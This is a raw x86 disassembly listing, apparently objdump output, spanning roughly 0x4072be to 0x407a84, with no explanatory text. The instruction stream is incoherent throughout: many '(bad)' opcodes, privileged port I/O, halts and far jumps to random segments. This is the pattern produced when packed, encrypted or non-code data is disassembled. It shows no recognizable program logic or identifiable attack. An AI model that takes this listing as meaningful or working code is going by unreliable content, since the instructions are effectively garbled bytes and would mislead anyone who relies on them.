  4072be:	xor    esp,DWORD PTR [eax-0x2d]
  4072c1:	les    edx,FWORD PTR [edx+edx*2]
  4072c4:	cs iret 
  4072c6:	xchg   ebp,eax
  4072c7:	out    0xc5,eax
  4072c9:	adc    edx,0x59c8efbf
  4072cf:	int3   
  4072d0:	xor    DWORD PTR [ecx],esi
  4072d2:	lods   al,BYTE PTR ds:[esi]
  4072d3:	aas    
  4072d4:	stc    
  4072d5:	cmp    esp,DWORD PTR [ecx]
  4072d7:	out    dx,eax
  4072d8:	jns    0x4072df
  4072da:	int3   
  4072db:	mov    ch,0x8d
  4072dd:	mov    WORD PTR [eax+0x6a],?
  4072e0:	mov    ah,0xb2
  4072e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072e3:	push   ds
  4072e4:	shr    DWORD PTR [ebx],0xc3
  4072e7:	popa   
  4072e8:	xlat   BYTE PTR ds:[ebx]
  4072e9:	int3   
  4072ea:	daa    
  4072eb:	pop    ds
  4072ec:	sub    edx,DWORD PTR [ebx]
  4072ee:	fmul   QWORD PTR [edi+eiz*1-0x52f12bff]
  4072f5:	ret    0x9dbe
  4072f8:	cmp    eax,0x4208c34c
  4072fd:	inc    edi
  4072fe:	shr    DWORD PTR [edx-0xb568c38],0x6f
  407305:	inc    eax
  407306:	dec    ebx
  407307:	cs call 0x2a95c4b6
  40730d:	and    al,0xe9
  40730f:	sub    DWORD PTR [esi],0x105613b9
  407315:	mov    ah,0x9c
  407317:	xchg   edi,eax
  407318:	and    eax,0x22f8bc40
  40731d:	out    0x15,al
  40731f:	dec    eax
  407320:	call   0xa36a:0xbadf4696
  407327:	rcl    BYTE PTR [ebp-0x3e0525db],0x54
  40732e:	pop    ebx
  40732f:	dec    ecx
  407330:	or     DWORD PTR [ecx],esi
  407332:	cmp    dh,dh
  407334:	mov    dh,0x71
  407336:	(bad)  
  407337:	(bad)  
  407338:	scas   al,BYTE PTR es:[edi]
  407339:	or     eax,0xfffffff4
  40733c:	inc    ebx
  40733d:	imul   eax,DWORD PTR [edi*4-0x5eb591ef],0xffffff84
  407345:	add    BYTE PTR [esi-0xe],dh
  407348:	retf   0xcc3e
  40734b:	mov    dl,0xd7
  40734d:	mov    WORD PTR [edx+eax*8-0x6b],es
  407351:	jmp    0x6179:0xd0700519
  407358:	sbb    al,BYTE PTR [esi]
  40735a:	mov    ebp,0xd447a0d2
  40735f:	fst    DWORD PTR [edx-0x7e]
  407362:	repz push ss
  407364:	lds    eax,FWORD PTR [ecx+0x31f4c5f7]
  40736a:	aaa    
  40736b:	jl     0x407334
  40736d:	mov    dh,0xfb
  40736f:	mov    al,BYTE PTR [eax+0x57a31a3f]
  407375:	gs (bad) 
  407377:	stos   DWORD PTR es:[edi],eax
  407378:	jae    0x407317
  40737a:	inc    edi
  40737b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40737c:	std    
  40737d:	mov    al,ds:0x6eeab3fa
  407382:	mov    cl,BYTE PTR [eax-0x2e]
  407385:	cmp    eax,DWORD PTR [ebx-0x45]
  407388:	jp     0x40733d
  40738a:	rcr    DWORD PTR [edx],cl
  40738c:	sub    al,BYTE PTR [edi]
  40738e:	jmp    0x38b6:0x3b1923dd
  407395:	mov    al,ds:0x251552e9
  40739a:	iret   
  40739b:	mov    esi,0x7dd3345c
  4073a0:	fwait
  4073a1:	enter  0x1df8,0x18
  4073a5:	pop    ds
  4073a6:	outs   dx,DWORD PTR ds:[esi]
  4073a7:	sar    DWORD PTR [ecx-0x749b856e],0x24
  4073ae:	sbb    eax,DWORD PTR [ecx-0x68]
  4073b1:	repz sbb edi,DWORD PTR [edi+0x72472de2]
  4073b8:	ret    
  4073b9:	or     BYTE PTR [edi],0x6c
  4073bc:	cli    
  4073bd:	retf   
  4073be:	(bad)  
  4073bf:	cmp    eax,0x5d6ee9bb
  4073c4:	imul   esi,DWORD PTR [esi+eax*4],0x28b35b6c
  4073cb:	dec    eax
  4073cc:	jmp    0x4ad649b9
  4073d1:	(bad)  
  4073d2:	jnp    0x4073c9
  4073d4:	pop    eax
  4073d5:	mov    ecx,edx
  4073d7:	pop    es
  4073d8:	mov    ecx,0x4676b507
  4073dd:	inc    esi
  4073de:	inc    eax
  4073df:	(bad)  
  4073e0:	adc    al,0xbf
  4073e2:	ds jge 0x4073f6
  4073e5:	mov    al,0xf9
  4073e7:	imul   esp,DWORD PTR [esi-0x42ffdbd1],0x52
  4073ee:	xchg   DWORD PTR [ecx-0x23],ebx
  4073f1:	jl     0x4073a9
  4073f3:	mov    esp,0xba1e1963
  4073f8:	mov    ?,WORD PTR [ebp-0x2]
  4073fb:	mov    WORD PTR [edx-0x1b1ea3fc],gs
  407401:	pop    ss
  407402:	xor    BYTE PTR [edi],ah
  407404:	xchg   ebx,eax
  407405:	ja     0x40738b
  407407:	daa    
  407408:	and    DWORD PTR ds:0x872b5573,esi
  40740e:	xlat   BYTE PTR ds:[ebx]
  40740f:	das    
  407410:	js     0x407411
  407412:	push   ebx
  407413:	jge    0x4073c1
  407415:	test   al,0x63
  407417:	out    0xfc,al
  407419:	test   al,0x63
  40741b:	gs imul dh
  40741e:	mov    ch,0x75
  407420:	or     eax,0xcd3065f1
  407425:	cmc    
  407426:	sti    
  407427:	add    eax,ebx
  407429:	mov    esp,0x2bca239d
  40742e:	and    al,ch
  407430:	dec    esi
  407431:	jns    0x4074b1
  407433:	fistp  QWORD PTR [esi-0x37]
  407436:	mov    ds:0xde53a36c,al
  40743b:	adc    ah,ch
  40743d:	ss adc al,0x4f
  407440:	mov    ds:0x3006601e,al
  407445:	xor    dl,BYTE PTR [ecx+0x1708c806]
  40744b:	add    eax,0x87c20fc0
  407450:	inc    eax
  407451:	push   ss
  407452:	xchg   esi,eax
  407453:	lahf   
  407454:	xchg   ebp,ebp
  407456:	inc    esp
  407457:	ins    DWORD PTR es:[edi],dx
  407458:	jae    0x4074b4
  40745a:	xor    DWORD PTR [eax-0x8],0x7dd3a30e
  407461:	hlt    
  407462:	jmp    0x407476
  407464:	sti    
  407465:	lods   eax,DWORD PTR ds:[esi]
  407466:	jns    0x4074a6
  407468:	jmp    0x627abc3
  40746d:	pop    es
  40746e:	cli    
  40746f:	int    0x49
  407471:	xchg   esi,eax
  407472:	cmp    al,BYTE PTR [esi+0x35]
  407475:	je     0x40742b
  407477:	cs popf 
  407479:	inc    ecx
  40747a:	lds    ecx,FWORD PTR [ebp-0x1f]
  40747d:	sbb    bh,bh
  40747f:	pop    ebx
  407480:	cld    
  407481:	pop    ebp
  407482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407483:	dec    ebx
  407484:	scas   eax,DWORD PTR es:[edi]
  407485:	push   ds
  407486:	jno    0x4074d0
  407488:	jg     0x40743f
  40748a:	inc    ebp
  40748b:	xchg   BYTE PTR [ecx],bh
  40748d:	gs xchg edx,eax
  40748f:	add    bh,BYTE PTR ds:0xb47c4950
  407495:	and    dl,cl
  407497:	shr    DWORD PTR [eax-0x36],0x58
  40749b:	sbb    DWORD PTR [edi-0xc63f661],0x46
  4074a2:	loope  0x4074b8
  4074a4:	add    ebx,DWORD PTR [ebp+0x20e4021d]
  4074aa:	clc    
  4074ab:	pop    edi
  4074ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ad:	mov    cr6,ecx
  4074b0:	jp     0x4074f7
  4074b2:	adc    DWORD PTR [esi],esp
  4074b4:	sbb    ebx,DWORD PTR [ecx]
  4074b6:	loop   0x4074e2
  4074b8:	test   eax,0x796a3d9e
  4074bd:	xor    edx,esp
  4074bf:	jbe    0x4074a5
  4074c1:	or     DWORD PTR [edx],0xffffffa8
  4074c4:	mov    edx,DWORD PTR [esi-0x42ae8584]
  4074ca:	pop    edx
  4074cb:	test   DWORD PTR [edi-0x3f1f7ba4],ebp
  4074d1:	push   0x1
  4074d3:	fwait
  4074d4:	(bad)  
  4074d6:	scas   al,BYTE PTR es:[edi]
  4074d7:	inc    edi
  4074d8:	sub    bl,cl
  4074da:	ds in  eax,dx
  4074dc:	push   esi
  4074dd:	mov    BYTE PTR [ebp+0xa],ch
  4074e0:	mov    cl,0x23
  4074e2:	imul   ebx,DWORD PTR [esp+ebp*8+0x6],0x1b
  4074e7:	fstp   DWORD PTR [eax+ebp*4-0x74]
  4074eb:	or     BYTE PTR [ebp-0x191441a3],bh
  4074f1:	xchg   edx,eax
  4074f2:	dec    eax
  4074f3:	sub    DWORD PTR [ebx+0x31e32a6],esi
  4074f9:	inc    ecx
  4074fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074fb:	xor    bl,BYTE PTR [ebp+0x78258a6d]
  407501:	xcrypt-ecb (bad)
  407502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407503:	mov    BYTE PTR [ebx-0x4f],ah
  407506:	dec    edi
  407507:	mov    cl,0xec
  407509:	lods   al,BYTE PTR ds:[esi]
  40750a:	jb     0x4074a5
  40750c:	and    DWORD PTR [edx+0x49],edx
  40750f:	jns    0x407543
  407511:	repnz das 
  407513:	fiadd  WORD PTR [edx]
  407515:	pop    edi
  407516:	mov    gs,ebx
  407518:	enter  0xa911,0xcd
  40751c:	aaa    
  40751d:	sub    eax,0xf3e6e38d
  407522:	aam    0x9e
  407524:	cmovp  esi,DWORD PTR [esi+0x671a3a36]
  40752b:	xor    ch,BYTE PTR [ecx-0x72]
  40752e:	js     0x407582
  407530:	xabort 0x10
  407533:	xor    esp,DWORD PTR ds:0x61fe650c
  407539:	or     cl,BYTE PTR [eax+0x67]
  40753c:	xchg   esp,eax
  40753d:	dec    eax
  40753e:	outs   dx,DWORD PTR ds:[esi]
  40753f:	mov    ecx,0x7a6f5719
  407544:	mov    bl,0xe7
  407546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407547:	arpl   WORD PTR [ebx+0x71],di
  40754a:	mov    ecx,edi
  40754c:	xchg   ebx,eax
  40754d:	ins    BYTE PTR es:[edi],dx
  40754e:	push   esi
  40754f:	pop    ss
  407550:	test   al,0xc0
  407552:	je     0x407515
  407554:	mov    ah,0x34
  407556:	test   al,0x38
  407558:	sbb    ch,BYTE PTR [ebx+ebp*1]
  40755b:	jnp    0x4074fe
  40755d:	dec    edi
  40755e:	mov    edi,0xa86ddee0
  407563:	leave  
  407564:	mov    esi,0x8f6cdb3f
  407569:	push   ds
  40756a:	mov    WORD PTR [ebx],fs
  40756c:	dec    DWORD PTR [edx]
  40756e:	or     BYTE PTR ds:0x8e28baf2,dl
  407574:	out    dx,eax
  407575:	xchg   edx,eax
  407576:	or     esp,ebx
  407578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407579:	adc    al,0x36
  40757b:	lods   al,BYTE PTR ds:[esi]
  40757c:	pop    ecx
  40757d:	in     al,dx
  40757e:	retf   
  40757f:	xor    eax,0xed058064
  407584:	mov    edi,0xb42fa1c
  407589:	adc    DWORD PTR [esi],esi
  40758b:	jmp    0x407563
  40758d:	push   edi
  40758e:	lds    edx,FWORD PTR [esi+0x4de0fe22]
  407594:	push   ebx
  407595:	cmp    BYTE PTR [ecx+0x4864fd4],bh
  40759b:	mov    DWORD PTR [edi+0x1744dd58],0x35bc9d77
  4075a5:	stos   DWORD PTR es:[edi],eax
  4075a6:	pop    es
  4075a7:	mov    esi,0x6ec7fc1a
  4075ac:	int    0x9a
  4075ae:	in     al,dx
  4075af:	push   ebx
  4075b0:	icebp  
  4075b1:	mov    edx,0x5c5bba4
  4075b6:	inc    esi
  4075b7:	mov    edi,0x131b9349
  4075bc:	and    al,0xf2
  4075be:	sbb    cl,BYTE PTR [eax+0x45]
  4075c1:	jo     0x4075d7
  4075c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c4:	jp     0x40759a
  4075c6:	test   eax,0x755b961a
  4075cb:	mov    WORD PTR [ebp+0x7f],es
  4075ce:	psllw  mm0,QWORD PTR [ebp+0x1b104933]
  4075d5:	mov    bh,0xb1
  4075d7:	rcr    DWORD PTR [ecx+0x1e16daed],cl
  4075dd:	jmp    0x407649
  4075df:	js     0x407561
  4075e1:	mov    ah,0xb6
  4075e3:	rcr    DWORD PTR [edx+0x7faa6d85],cl
  4075e9:	inc    edi
  4075ea:	jp     0x407575
  4075ec:	cwde   
  4075ed:	pop    eax
  4075ee:	sbb    DWORD PTR ds:0x5d885b72,ecx
  4075f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f5:	jp     0x40761b
  4075f7:	mov    ?,WORD PTR [ecx]
  4075f9:	cli    
  4075fa:	add    eax,0xa615f4a0
  4075ff:	pushf  
  407600:	sbb    eax,0x412d9cd7
  407605:	loop   0x4075e1
  407607:	out    dx,eax
  407608:	jecxz  0x407621
  40760a:	stos   DWORD PTR es:[edi],eax
  40760b:	mov    ch,0xc2
  40760d:	mov    dh,0x4b
  40760f:	outs   dx,BYTE PTR gs:[esi]
  407611:	inc    edx
  407612:	mov    cl,0x5b
  407614:	cwde   
  407615:	or     ebx,DWORD PTR [esi]
  407617:	xor    al,0x13
  407619:	add    esp,ebp
  40761b:	sbb    BYTE PTR [ebx+0x20],cl
  40761e:	xchg   ebx,eax
  40761f:	and    bh,BYTE PTR [ecx-0x7535d85c]
  407625:	cdq    
  407626:	mov    ebx,DWORD PTR [ebx+ecx*4+0x3c]
  40762a:	xor    dl,BYTE PTR [ecx]
  40762c:	jmp    0xbcc2a9a5
  407631:	addr16 pusha 
  407633:	and    esi,esi
  407635:	jl     0x4075b8
  407637:	mov    eax,0xfee140a9
  40763c:	mov    edi,0x66087bca
  407641:	dec    edx
  407642:	pop    ds
  407643:	and    BYTE PTR [ecx+0x56705a14],0x30
  40764a:	cmp    ah,cl
  40764c:	sub    al,ah
  40764e:	lahf   
  40764f:	add    al,0x44
  407651:	ss mov edx,0xb1e8e3eb
  407657:	std    
  407658:	pop    ss
  407659:	js     0x40769b
  40765b:	es add al,0xd5
  40765e:	jb     0x40768f
  407660:	push   ds
  407661:	xchg   ecx,eax
  407662:	mov    esp,DWORD PTR [ecx*4-0x537e9122]
  407669:	inc    edx
  40766a:	mov    dh,BYTE PTR [eax+ecx*2+0x3973ec16]
  407671:	mov    eax,ds:0xd0377cc2
  407676:	add    BYTE PTR [edi-0x4f15f36f],bl
  40767c:	push   0xffffffd1
  40767e:	xchg   ebx,eax
  40767f:	ins    BYTE PTR es:[edi],dx
  407680:	xchg   ebp,eax
  407681:	out    0xec,eax
  407683:	arpl   WORD PTR [edi+ebp*1+0x75aaa2b3],sp
  40768a:	adc    dl,BYTE PTR [esi-0x12]
  40768d:	mov    edx,0xc36024ee
  407692:	sbb    DWORD PTR [ecx+0x74561c6d],ebx
  407698:	xor    DWORD PTR ds:0x758a41de,esp
  40769e:	lea    ebp,[esi-0x441962b5]
  4076a4:	div    BYTE PTR [edx]
  4076a6:	pop    ebx
  4076a7:	xchg   ebx,eax
  4076a8:	jg     0x407657
  4076aa:	lea    esi,[esi+0x75c5e045]
  4076b0:	loopne 0x40763d
  4076b2:	jno    0x407683
  4076b4:	jnp    0x407660
  4076b6:	call   0x6ba4:0xb21d368a
  4076bd:	test   al,0x8c
  4076bf:	test   DWORD PTR [edi+edi*2],eax
  4076c2:	dec    esp
  4076c3:	cld    
  4076c4:	stos   DWORD PTR es:[edi],eax
  4076c5:	out    0xeb,al
  4076c7:	push   ecx
  4076c8:	mov    eax,eax
  4076ca:	out    dx,eax
  4076cb:	arpl   sp,di
  4076cd:	out    0x5b,al
  4076cf:	or     DWORD PTR [edi-0x7e97710],ecx
  4076d5:	cmp    BYTE PTR [esi+ebp*8],cl
  4076d8:	push   eax
  4076d9:	inc    edi
  4076da:	push   0xffffff95
  4076dc:	xor    al,0x18
  4076de:	xor    dh,bh
  4076e0:	hlt    
  4076e1:	mov    BYTE PTR [ebp-0x5e],0xf7
  4076e5:	data16 cmp cl,BYTE PTR ds:[ecx]
  4076e9:	icebp  
  4076ea:	loop   0x407769
  4076ec:	adc    eax,DWORD PTR [esp+edi*1]
  4076ef:	jp     0x407741
  4076f1:	(bad)
  4076f5:	loop   0x4076f6
  4076f7:	add    ah,BYTE PTR [ebx-0x26d7bbef]
  4076fd:	fmul   DWORD PTR [esi-0x23fb2c0e]
  407703:	xchg   ebx,eax
  407704:	push   ds
  407705:	out    dx,al
  407706:	adc    al,0x47
  407708:	mov    esi,DWORD PTR [ebp-0x63]
  40770b:	ret    0x9923
  40770e:	aas    
  40770f:	cs es loop 0x4076f9
  407713:	in     eax,0xfe
  407715:	push   esi
  407716:	ret    0x9f9c
  407719:	mov    bl,BYTE PTR [edx+0x30]
  40771c:	sbb    BYTE PTR [edi-0x10c7ee7d],ah
  407722:	xchg   esi,eax
  407723:	push   ebx
  407724:	popf   
  407725:	pop    ebx
  407726:	jno    0x407762
  407728:	addr16 popf 
  40772a:	push   ecx
  40772b:	xor    cl,bh
  40772d:	xchg   esp,eax
  40772e:	loope  0x407771
  407730:	push   ebp
  407731:	push   ds
  407732:	repz out dx,eax
  407734:	xlat   BYTE PTR ds:[ebx]
  407735:	test   BYTE PTR [edx+0x21],cl
  407738:	in     eax,dx
  407739:	adc    eax,0xd58ab324
  40773e:	jae    0x4076ff
  407740:	(bad)  
  407742:	sti    
  407743:	xor    BYTE PTR [ebx+0x79],bh
  407746:	(bad)
  407749:	pop    ebx
  40774a:	mov    bl,0xb9
  40774c:	shl    esi,cl
  40774e:	dec    edi
  40774f:	add    DWORD PTR [esp+edi*8],edi
  407752:	and    eax,0x98af854c
  407757:	loope  0x40779b
  407759:	loop   0x4077c7
  40775b:	inc    eax
  40775c:	mov    eax,0x82ba58a2
  407761:	fadd   QWORD PTR [ebx+0x16c492d3]
  407767:	adc    ch,BYTE PTR [eax-0x2d]
  40776a:	sub    BYTE PTR [esi-0x11],cl
  40776d:	sbb    edx,eax
  40776f:	stos   DWORD PTR es:[edi],eax
  407770:	cli    
  407771:	loop   0x407746
  407773:	push   ds
  407774:	jp     0x4076fc
  407776:	mov    edi,0x2e3a50c9
  40777b:	inc    eax
  40777c:	adc    eax,0x72c6bd00
  407781:	xchg   ecx,eax
  407782:	adc    ecx,esi
  407784:	xor    ah,BYTE PTR [ebp-0x1db03f8f]
  40778a:	mov    bl,0x4e
  40778c:	sub    ah,BYTE PTR [ecx-0x42685d48]
  407792:	imul   edi,DWORD PTR [edx-0x77],0xf29fab24
  407799:	inc    ebp
  40779a:	ret    
  40779b:	jmp    0xaccd:0xb4fb41d6
  4077a2:	xchg   ebx,eax
  4077a3:	int3   
  4077a4:	enter  0x581e,0x98
  4077a8:	(bad)  
  4077a9:	call   0x50cb5d48
  4077ae:	adc    esp,edi
  4077b0:	mov    ebx,0x71d0dbdf
  4077b5:	xchg   BYTE PTR [ecx+eiz*4-0x21685bae],bh
  4077bc:	pop    ecx
  4077bd:	pop    edx
  4077be:	lods   al,BYTE PTR ds:[esi]
  4077bf:	xchg   DWORD PTR [edi+0x3a],esp
  4077c2:	sub    WORD PTR ds:0x8514,di
  4077c8:	jnp    0x4077a0
  4077ca:	dec    ecx
  4077cb:	mov    cl,0x78
  4077cd:	dec    edx
  4077ce:	clc    
  4077cf:	sub    eax,DWORD PTR [edi-0x7f9a273a]
  4077d5:	or     al,0x6f
  4077d7:	sar    bl,cl
  4077d9:	push   es
  4077da:	loopne 0x407847
  4077dc:	ret    
  4077dd:	std    
  4077de:	mov    bh,0xe6
  4077e1:	push   0x83f45b44
  4077e6:	ret    0x216d
  4077e9:	scas   eax,DWORD PTR es:[edi]
  4077ea:	mov    WORD PTR [esp+edi*4-0x3b],gs
  4077ee:	jo     0x4077f2
  4077f0:	add    al,0xed
  4077f2:	pop    esi
  4077f3:	push   eax
  4077f4:	js     0x4077f0
  4077f6:	jl     0x40784e
  4077f8:	ror    DWORD PTR [ebx+0x417d1ce6],1
  4077fe:	fs ret 0xcbac
  407802:	imul   esi,DWORD PTR [esi],0x6567d00a
  407808:	std    
  407809:	shl    DWORD PTR [eax-0x47],1
  40780c:	test   eax,0x77766b6a
  407811:	nop
  407812:	pop    ds
  407813:	mov    cl,0xb5
  407815:	js     0x407847
  407817:	cmp    BYTE PTR [esi],ch
  407819:	mov    ebp,0xdeb1ba2b
  40781e:	or     al,0x7d
  407820:	aad    0xcb
  407822:	arpl   WORD PTR [ecx+0x6215c1dd],si
  407828:	sbb    al,0xc3
  40782a:	xchg   ebp,eax
  40782b:	hlt    
  40782c:	lock inc edi
  40782e:	xchg   edx,eax
  40782f:	mov    eax,ds:0x3922079e
  407834:	pushf  
  407835:	fdiv   DWORD PTR [ecx]
  407837:	cdq    
  407838:	icebp  
  407839:	stc    
  40783a:	call   0xb4fb:0xa03a9bf4
  407841:	and    DWORD PTR [eax+0x2d],edx
  407844:	in     eax,0x85
  407846:	or     al,0xa1
  407848:	adc    DWORD PTR [ebp-0x2f],ebx
  40784b:	or     BYTE PTR ss:[eax],dh
  40784e:	out    0xc7,eax
  407850:	stos   DWORD PTR es:[edi],eax
  407851:	sub    esi,DWORD PTR [eax]
  407853:	add    eax,0xe68ebe3f
  407858:	cmp    BYTE PTR [edx+0xe],bl
  40785b:	add    bl,ah
  40785d:	fstp   TBYTE PTR [edx+0x203e18e9]
  407863:	in     al,dx
  407864:	out    0xc2,al
  407866:	cmp    al,0x94
  407868:	push   0x2b
  40786a:	pop    esi
  40786b:	int    0x9f
  40786d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40786e:	ins    BYTE PTR es:[edi],dx
  40786f:	cli    
  407870:	ds out dx,eax
  407872:	mov    al,ds:0x5a2cee25
  407877:	es dec ebp
  407879:	sub    eax,0x9701e21c
  40787e:	push   ds
  40787f:	push   ds
  407880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407881:	or     DWORD PTR [edi-0x40daf482],edi
  407887:	fwait
  407888:	and    al,0x16
  40788a:	scas   eax,DWORD PTR es:[edi]
  40788b:	cmc    
  40788c:	mov    ebp,0x2060411
  407891:	xchg   BYTE PTR [ebp-0x4],al
  407894:	adc    cl,cl
  407896:	mov    al,BYTE PTR [eax]
  407898:	in     eax,dx
  407899:	enter  0x5e10,0xc1
  40789d:	repz call 0xbee3:0x5ab7a83e
  4078a5:	je     0x4078a3
  4078a7:	pop    edx
  4078a8:	lea    edx,[ecx+0x49d75964]
  4078ae:	xchg   edi,eax
  4078af:	bound  ecx,QWORD PTR [edi-0x6b7fa01e]
  4078b5:	pop    ebx
  4078b6:	xchg   edi,eax
  4078b7:	inc    edx
  4078b8:	cwde   
  4078b9:	push   esi
  4078ba:	mov    esp,0x193efb1a
  4078bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c0:	iret   
  4078c1:	and    DWORD PTR [edi-0x52],esi
  4078c4:	dec    esp
  4078c5:	enter  0xf41b,0xe8
  4078c9:	jmp    0x407872
  4078cb:	outs   dx,BYTE PTR ds:[esi]
  4078cc:	addr16 cmp eax,0xc38d5e8f
  4078d2:	(bad)  
  4078d3:	dec    ecx
  4078d4:	sub    ebx,DWORD PTR [ebx-0x31]
  4078d7:	rol    DWORD PTR [esi],0x88
  4078da:	call   0x64960071
  4078df:	jae    0x407903
  4078e1:	push   0xffffffc9
  4078e3:	pop    esp
  4078e4:	push   esp
  4078e5:	sub    edi,DWORD PTR [ecx-0x8061270]
  4078eb:	and    al,0xc0
  4078ed:	push   eax
  4078ee:	xchg   ebx,eax
  4078ef:	scas   al,BYTE PTR es:[edi]
  4078f0:	cmp    ah,BYTE PTR [edi-0x282d9b95]
  4078f6:	out    dx,al
  4078f7:	stos   BYTE PTR es:[edi],al
  4078f8:	fisub  WORD PTR [ebx+0x57]
  4078fb:	shr    BYTE PTR [edx-0x4a593674],1
  407901:	fld    st(5)
  407903:	xchg   ebx,eax
  407904:	mov    ds:0xe9ef1924,eax
  407909:	leave  
  40790a:	sub    dl,BYTE PTR [ecx]
  40790c:	jecxz  0x4078c0
  40790e:	inc    ebx
  40790f:	pop    ebx
  407910:	xchg   esi,eax
  407911:	imul   esi,ebx,0x9d904295
  407917:	cmp    BYTE PTR [eax],bh
  407919:	or     al,bl
  40791b:	xor    BYTE PTR [ebx],dh
  40791d:	pop    edi
  40791e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40791f:	fisub  DWORD PTR [esi]
  407921:	in     eax,dx
  407922:	cmp    BYTE PTR [edx],dl
  407924:	cmp    BYTE PTR [esi+0x66],dl
  407927:	add    DWORD PTR [esi],eax
  407929:	xor    al,0x3a
  40792b:	xchg   esp,eax
  40792c:	mov    al,ds:0xc8336c67
  407931:	aad    0xd9
  407933:	mov    eax,ds:0x380f7a96
  407938:	aas    
  407939:	and    eax,0xef35ee73
  40793e:	(bad)  
  40793f:	push   esp
  407940:	addr16 shr al,0x88
  407944:	sub    ch,BYTE PTR [eax+0x7f7c54c5]
  40794a:	and    dh,BYTE PTR [esi+eax*2]
  40794d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794e:	sbb    esp,DWORD PTR [esi-0x6e55cfb8]
  407954:	inc    eax
  407955:	adc    ah,dh
  407957:	outs   dx,DWORD PTR ds:[esi]
  407958:	mov    ss,eax
  40795a:	cli    
  40795b:	add    ebp,edx
  40795d:	add    eax,0xbb99de36
  407962:	add    al,0x2a
  407964:	out    dx,al
  407965:	mov    al,ds:0x6a9daefb
  40796a:	or     BYTE PTR ds:0x826fea08,ch
  407970:	sbb    ebp,ebp
  407972:	js     0x4079d9
  407974:	scas   eax,DWORD PTR es:[edi]
  407975:	cmp    esp,DWORD PTR [ecx]
  407977:	(bad)  
  407978:	mov    edx,0x7dca554e
  40797d:	sbb    al,BYTE PTR [edx]
  40797f:	cs pop ds
  407981:	outs   dx,BYTE PTR ds:[esi]
  407982:	iret   
  407983:	out    dx,eax
  407984:	mov    cl,0x5f
  407986:	pop    ds
  407987:	jge    0x4079b6
  407989:	fwait
  40798a:	inc    ebp
  40798b:	sub    eax,0x75da8717
  407990:	jnp    0x40798c
  407992:	mov    ecx,0xf3125cc8
  407997:	xor    al,0xd5
  407999:	hlt    
  40799a:	push   edi
  40799b:	mov    eax,DWORD PTR [eax+0x3f02491d]
  4079a1:	adc    al,0x95
  4079a3:	scas   eax,DWORD PTR es:[edi]
  4079a4:	je     0x407968
  4079a6:	in     eax,0x57
  4079a8:	hlt    
  4079a9:	dec    eax
  4079aa:	clc    
  4079ab:	push   esi
  4079ac:	test   BYTE PTR es:[ecx+0x43],bh
  4079b0:	fucomip st,st(3)
  4079b2:	xor    dh,BYTE PTR [ecx]
  4079b4:	pop    ecx
  4079b5:	ss sub eax,0x62fbb463
  4079bb:	jp     0x4079cb
  4079bd:	xchg   ebx,eax
  4079be:	add    cl,BYTE PTR [ecx+0x649065ca]
  4079c4:	cwde   
  4079c5:	xor    bl,BYTE PTR [eax]
  4079c7:	cwde   
  4079c8:	xlat   BYTE PTR ds:[ebx]
  4079c9:	pop    esi
  4079ca:	call   0x4d94:0x5b550b9a
  4079d1:	mul    bl
  4079d3:	adc    cl,dh
  4079d5:	jmp    0x60ef:0x2f2964f9
  4079dc:	aad    0x86
  4079de:	ss and eax,0x13993253
  4079e4:	jns    0x40799d
  4079e6:	mov    ds:0x506fa5df,eax
  4079eb:	mov    ebp,0xe5c4aaf0
  4079f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f1:	xchg   BYTE PTR ds:0x464bddd5,ch
  4079f7:	stos   BYTE PTR es:[edi],al
  4079f8:	push   esi
  4079f9:	aas    
  4079fa:	pop    edx
  4079fb:	or     BYTE PTR [eax+0x17bea2d9],dl
  407a01:	sub    dh,ah
  407a03:	ds into 
  407a05:	mov    dh,BYTE PTR [ecx-0x54]
  407a08:	mov    ds,esi
  407a0a:	jnp    0x4079cd
  407a0c:	pop    ecx
  407a0d:	jmp    0x407a60
  407a0f:	add    al,0x5d
  407a11:	imul   ebx,ecx,0x5aaf19bf
  407a17:	xor    al,0xb0
  407a19:	pop    es
  407a1a:	sub    BYTE PTR [ebx-0x5442ec23],al
  407a20:	jmp    0x4079b2
  407a22:	jne    0x4079f6
  407a24:	imul   ebx,DWORD PTR [ecx],0x781902aa
  407a2a:	cmp    eax,0xd79d7dc9
  407a2f:	push   0x18
  407a31:	or     DWORD PTR [ebx-0x74],esp
  407a34:	sar    dh,0x4d
  407a37:	adc    esi,DWORD PTR [edi+0x2de98934]
  407a3d:	cwde   
  407a3e:	dec    DWORD PTR [edx+0x4c]
  407a41:	retf   
  407a42:	or     eax,0x29059b17
  407a47:	loope  0x4079d8
  407a49:	jne    0x4079ea
  407a4b:	scas   eax,DWORD PTR es:[edi]
  407a4c:	sar    BYTE PTR [ecx+ecx*4-0x6ec92262],1
  407a53:	std    
  407a54:	sub    ecx,DWORD PTR [ebp+0x7c51b8fe]
  407a5a:	test   al,0xe0
  407a5c:	pop    ecx
  407a5d:	cmp    al,0xec
  407a5f:	das    
  407a60:	lock dec esi
  407a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a63:	inc    esi
  407a64:	or     edi,0x5c
  407a67:	cdq    
  407a68:	push   0x41e13a6f
  407a6d:	scas   eax,DWORD PTR es:[edi]
  407a6e:	and    ecx,DWORD PTR [ecx-0x80]
  407a71:	in     al,dx
  407a72:	in     al,dx
  407a73:	xchg   esp,eax
  407a74:	jno    0x407ace
  407a76:	scas   al,BYTE PTR es:[edi]
  407a77:	fwait
  407a78:	pop    ecx
  407a79:	pop    ecx
  407a7a:	(bad)  
  407a7b:	adc    ecx,DWORD PTR [ebx+0x77]
  407a7e:	inc    esi
  407a7f:	mov    esi,0x1dd485f6
  407a84:	mov    ebp,0xba94fb46
